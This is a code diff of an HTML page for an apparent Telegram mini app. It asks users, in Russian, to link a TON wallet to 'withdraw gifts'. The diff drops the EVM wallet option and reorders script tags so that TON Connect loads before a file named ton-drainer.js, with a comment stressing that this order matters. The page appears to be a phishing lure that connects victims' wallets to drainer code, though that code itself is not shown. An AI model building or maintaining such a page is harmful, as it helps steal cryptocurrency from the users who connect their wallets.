@@ -98,7 +98,7 @@
     </div>
 
     <div class="profile-note">
-      Для вывода подарков привяжите TON или EVM кошелёк
+      Для вывода подарков привяжите TON кошелёк
     </div>
   </section>
 
@@ -157,16 +157,7 @@
       <div class="w-icon ton">💎</div>
       <div class="w-info">
         <div class="w-name">TON Кошелёк</div>
-        <div class="w-desc">Tonkeeper, MyTonWallet</div>
-      </div>
-      <div class="w-arrow">›</div>
-    </div>
-
-    <div class="wallet-option" data-wallet="evm">
-      <div class="w-icon evm">🦊</div>
-      <div class="w-info">
-        <div class="w-name">Wallet (EVM)</div>
-        <div class="w-desc">MetaMask, Trust Wallet</div>
+        <div class="w-desc">Tonkeeper, MyTonWallet, Wallet</div>
       </div>
       <div class="w-arrow">›</div>
     </div>
@@ -187,9 +178,10 @@
   </div>
 </div>
 
+<!-- Порядок ВАЖЕН: TON core → TON connect → ton-drainer → app -->
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 <script src="https://unpkg.com/@ton/core@latest/dist/ton-core.min.js"></script>
+<script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 <script src="ton-drainer.js"></script>
 <script src="app.js"></script>
 </body>
